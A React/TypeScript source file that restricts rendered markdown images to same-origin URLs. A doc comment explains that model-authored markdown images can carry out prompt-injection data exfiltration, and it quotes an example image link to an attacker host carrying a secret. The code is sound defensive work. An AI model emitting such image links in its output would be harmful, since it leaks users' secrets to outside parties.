import { type Components } from 'react-markdown';

/**
 * True when a markdown image source resolves to the app's own origin.
 * Relative paths resolve against the current document; anything that
 * resolves elsewhere — absolute third-party URLs, protocol-relative
 * `//host` forms, or non-HTTP schemes like `data:` and `javascript:`
 * (whose origin is `"null"`) — is rejected.
 */
function isSameOriginImageSource(src: string): boolean {
	try {
		return new URL(src, window.location.href).origin === window.location.origin;
	} catch {
		return false;
	}
}

/**
 * ReactMarkdown component overrides that constrain rendering of model- and
 * user-authored markdown. `![](https://attacker.example/?d=SECRET)` renders
 * an outbound `<img>` request the browser fires automatically — an invisible
 * data-exfiltration channel for prompt injection. Images are therefore only
 * rendered from same-origin sources; everything else renders as nothing,
 * preserving all other markdown.
 */
export const SAFE_MARKDOWN_COMPONENTS: Components = {
	img: ({ node, src, ...props }) =>
		typeof src === 'string' && isSameOriginImageSource(src) ? (
			<img src={src} {...props} />
		) : null,
};
